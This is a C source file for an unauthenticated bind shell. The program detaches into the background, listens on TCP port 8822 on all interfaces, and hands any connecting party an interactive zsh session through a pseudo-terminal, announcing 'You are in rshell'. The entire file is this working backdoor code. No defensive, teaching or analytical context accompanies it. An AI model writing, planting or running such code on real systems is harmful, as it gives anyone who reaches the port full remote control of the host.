#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <pty.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>

#define BUF_SIZE 500

int main (int argc, char ** argv)
{
    if (!fork())
    {
        setsid();
        struct addrinfo hints;
        struct addrinfo * result, *rp;
        int sfd, s;
        struct sockaddr peer_addr;
        socklen_t peer_addr_len;

        int option = 1;

        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;    /* Allow IPv4 or IPv6 */
        hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
        hints.ai_flags = AI_PASSIVE;    /* For wildcard IP address */
        hints.ai_protocol = 0;          /* Any protocol */
        hints.ai_canonname = NULL;
        hints.ai_addr = NULL;
        hints.ai_next = NULL;

        s = getaddrinfo(NULL, "8822", &hints, &result);

        if (s != 0)
        {
            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
            exit(EXIT_FAILURE);
        }

        rp = result;
        sfd = socket(rp->ai_family, rp->ai_socktype,
                     rp->ai_protocol);

        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, (char *) & option, sizeof(option)) != 0)
        {
            fprintf(stderr, "Could not set options to socket\n");
            exit(EXIT_FAILURE);
        }

        if (bind(sfd, rp->ai_addr, rp->ai_addrlen) != 0)
        {
            fprintf(stderr, "Could not bind\n");
            exit(EXIT_FAILURE);
        }

        freeaddrinfo(result);           /* No longer needed */


        if (listen(sfd, 100) != 0)
        {
            fprintf(stderr, "Could not start listen\n");
            exit(EXIT_FAILURE);
        }

        int acceptfd = accept(sfd, &peer_addr, &peer_addr_len);

        if (acceptfd == -1)
        {
            fprintf(stderr, "Could not accept\n");
            exit(EXIT_FAILURE);
        }

        if (fork())
        {
            if (close(acceptfd) == -1)
            {
                fprintf(stderr, "Could not close\n");
                exit(EXIT_FAILURE);
            }
        }
        else
        {
            int master, slave;
            char buff[4096];

            if ( openpty(&master, &slave, buff, NULL, NULL) == -1)
            {
                fprintf(stderr, "Could not open pty\n");
                exit(EXIT_FAILURE);
            }

            if (fork())
            {
                close(slave);
                int flags;
                flags = fcntl(master, F_GETFL);

                if (flags < 0)
                {
                    exit (1);
                }

                flags = flags | O_NONBLOCK;
                fcntl(master, F_SETFL, flags);
                flags = fcntl(acceptfd, F_GETFL);

                if (flags < 0)
                {
                    exit (1);
                }

                flags = flags | O_NONBLOCK;
                fcntl(acceptfd, F_SETFL, flags);
                char ** buffer = malloc(2 *sizeof(char * ));
                buffer[0] = malloc(4096);
                buffer[1] = malloc(4096);
                int read_result_fd[2];
                struct pollfd fds[2];
                int timeout_msecs = -1;
                int ret;

                fds[0].fd = master;
                int events = POLLIN | POLLERR | POLLHUP | POLLNVAL;
                fds[0].events = events;
                fds[1].fd = acceptfd;
                fds[1].events = events;
                sleep(1);

                write(acceptfd, "Hello! You are in rshell\n", 25);

                while (1)
                {
                    ret = poll(fds, 2, timeout_msecs);

                    if (ret > 0)
                    {
                        int i;

                        for (i = 0; i < 2; i++)
                        {
							int j = i == 0 ? 1 : 0;
                            if (fds[i].revents & POLLIN)
                            {
                                read_result_fd[i] = read(fds[i].fd, buffer[i], 4096);

                                if (read_result_fd[i] == 0)
                                {
                                    close(fds[i].fd);
                                    fds[i].events = 0;
                                }
                                else if (read_result_fd[i] < 0)
                                    if (errno != EWOULDBLOCK && errno != EAGAIN)
                                    {
                                        close(fds[i].fd);
                                        fds[i].events = 0;
                                        free(buffer[0]);
                                        free(buffer[1]);
                                        free(buffer);
                                        exit(1);
                                    }

                                fds[j].events = fds[!i].events | POLLOUT;
                            }

                            if (fds[j].revents & POLLOUT)
                            {
                                if (read_result_fd[i] != 0)
                                {
                                    read_result_fd[i] -= write(fds[j].fd, buffer[i], read_result_fd[i]);
                                }
                                fds[j].events = fds[j].events ^ POLLOUT;

                            }
                        }
                        for (i = 0; i < 2; i++)
                        {
                            int const else_polls = POLLERR | POLLHUP | POLLNVAL;

                            if (fds[i].revents & else_polls)
                            {
                                close(fds[1].fd);
                                fds[1].events = 0;
                                free(buffer[0]);
                                free(buffer[1]);
                                free(buffer);
                                exit(1);
                            }
                        }
                    }
                    else
                    {
                        break;
                    }

                    //  if ( !ret )
                    //  {
                    //      write(fds[0].fd, "Timeout!\n", 9);
                    //      exit(0);
                    //      free(buffer[0]);free(buffer[1]);free(buffer);
                    //  }
                }

                free(buffer[0]);
                free(buffer[1]);
                free(buffer);
                exit(0);
            }
            else
            {
                dup2(slave, 0);
                dup2(slave, 1);
                dup2(slave, 2);
                close(master);
                close(slave);
                close(acceptfd);
                setsid();
                int fd = open(buff,  O_RDWR);
                close(fd);
                execl("/bin/zsh", "zsh", NULL);
                exit(1);
            }
        }
    }

    return 0;
}
